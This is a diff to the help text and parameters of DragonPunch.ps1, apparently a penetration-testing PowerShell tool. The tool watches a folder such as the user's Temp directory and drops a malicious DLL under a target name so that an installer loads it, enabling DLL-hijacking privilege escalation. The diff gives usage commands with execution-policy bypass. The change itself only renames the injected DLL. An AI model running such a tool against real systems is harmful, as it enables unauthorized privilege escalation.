@@ -8,7 +8,7 @@ Example situations would be when an insecure installation application is downloa
 Dragon Punch will monitor a folder for the creation of any new files and then drop a malicious binary into the folder where the new file was created.
  
 Usage
-Powershell -ExecutionPolicy Bypass -File DragonPunch.ps1 -Path C:\Users\User\AppData\Local\Temp\ -Filter * -Recurse -Interval 1500 -File C:\tools\LEAP\bin\Inject.dll -Target DragonPlugin.dll
+Powershell -ExecutionPolicy Bypass -File DragonPunch.ps1 -Path C:\Users\User\AppData\Local\Temp\ -Filter * -Recurse -Interval 1500 -File C:\tools\LEAP\bin\LEAPInject.dll -Target DragonPlugin.dll
  
 Command Line Arguments
 DragonPunch.ps1 -PATH <string:FullPath> -FILTER <string> -RECURSE -INTERVAL <int> -File <string:FullFileName> -Target <string:Filename>
@@ -32,17 +32,17 @@ The default time is 1500 milliseconds
 
 FILE
 The file that DragonPunch will copy to the monitor PATH (and subdirectories if RECURSE is set) in hopes to hijack or overwrite another file so that a user can elevate their privileges.
-By default DragonPunch will use ..\bin\Inject.dll as the default file for injection
+By default DragonPunch will use ..\bin\LEAPInject.dll as the default file for injection
 
 TARGET
 This is the filename that DragonPunch is hoping to hijack using the file specified by FILE in the monitored folder specified by PATH.
 example: 
-DragonPunch.ps1 ... -File C:\tools\LEAP\bin\Inject.dll -Target DragonPlugin.dll
-this will copy C:\tools\bin\Inject.dll to the monitored folder as DragonPlugin.dll
+DragonPunch.ps1 ... -File C:\tools\LEAP\bin\LEAPInject.dll -Target DragonPlugin.dll
+this will copy C:\tools\bin\LEAPInject.dll to the monitored folder as DragonPlugin.dll
  
 Usage Scenario
 If an application is downloading and loading the file "TrustedInstaller.dll" from a randomly generated subfolder within the current user's temp folder, DragonPunch can be execute with the following parameters in order to attempt to exploit this:
-DragonPunch.ps1 -Path C:\Users\User\AppData\Local\Temp\ -Filter * -Recurse -File C:\tools\LEAP\bin\Inject.dll -Target TrustedInstaller.dll
+DragonPunch.ps1 -Path C:\Users\User\AppData\Local\Temp\ -Filter * -Recurse -File C:\tools\LEAP\bin\LEAPInject.dll -Target TrustedInstaller.dll
  
 #>
 
@@ -69,7 +69,7 @@ Param
     [int]$Interval = 1500,
 
     [Parameter(ValueFromPipelineByPropertyName = $true)]
-    [string]$File = $(Split-Path $MyInvocation.MyCommand.Path -Parent) + "\bin\Inject.dll",
+    [string]$File = $(Split-Path $MyInvocation.MyCommand.Path -Parent) + "\bin\LEAPInject.dll",
 
     [Parameter(ValueFromPipelineByPropertyName = $true)]
     [string]$Target = $(Split-Path $File -Leaf)
